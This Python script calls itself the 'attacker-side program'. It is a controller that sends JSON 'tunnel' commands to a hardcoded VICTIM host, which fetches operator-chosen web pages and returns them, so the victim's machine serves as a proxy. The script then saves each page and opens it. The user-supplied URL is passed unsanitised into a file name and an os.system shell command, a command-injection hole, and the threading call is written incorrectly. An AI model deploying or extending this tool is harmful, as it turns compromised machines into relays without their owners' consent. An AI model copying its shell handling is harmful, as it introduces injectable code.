#!/usr/bin/python3

import requests;
import json;
import os;
import threading;

''' GLOBAL VARS '''
VICTIM = ("127.0.0.1",1337); # (<ip_address>, <port_no.>)

''' FUNCTIONS '''
def menu():
	choices = ["tunnel", "quit"];
	print(" :: MENU ::");
	print(" - tunnel");
	print(" - quit");
	while True:
		inp = input("-> ").lstrip(" ").rstrip(" ");
		if inp in choices:
			return(inp);
			
def send(action,value):
	payload = json.dumps({"action":action,"value":value});
	vic_url = "http://"+VICTIM[0]+":"+str(VICTIM[1])+"";
	resp = requests.get(vic_url,data=payload);
	return(resp.content);

def tunnel():
	url = input("[address] -> ");
	print("Fetching....");
	bin_resp = send("tunnel",url);
	print("Got response! Saving to "+url+".html");
	op_file = open(url+".html","wb");
	op_file.write(bin_resp);
	op_file.close();
	choice = input("Open Site? [y/n] : ");
	if choice == "y" or choice == "Y":
		threading.Thread(target=os.system("xdg-open "+url+".html 1> /dev/null"));
	return;

''' MAIN '''
if __name__ == "__main__":
	print("Starting attacker-side program....");
	run_flag = True;
	
	while run_flag == True:
		choice = menu();
		if choice == "tunnel":
			tunnel();
		elif choice == "quit":
			run_flag = False;
		print("\n\n");
